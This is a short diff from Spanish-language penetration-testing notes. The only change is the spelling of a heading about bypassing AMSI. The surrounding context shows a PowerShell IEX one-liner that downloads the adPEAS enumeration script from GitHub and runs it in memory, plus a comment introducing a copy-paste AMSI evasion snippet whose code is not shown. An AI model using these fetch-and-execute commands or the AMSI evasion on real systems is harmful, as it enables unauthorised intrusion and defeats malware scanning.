@@ -54,7 +54,7 @@ Los siguientes scripts los podemos ejecutar en la consola de  **Powershell**  an
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adPEAS/main/adPEAS.ps1')
 ```
 
-## Otra alternativa para el ByPass:
+## Otra alternativa para el Bypass:
 
 ```Powershell 
 # Copiar y pegar en powershell para evadir el AMSI (Efectiva). Esto solo funciona al cargar en memoria los binarios ".PS1"
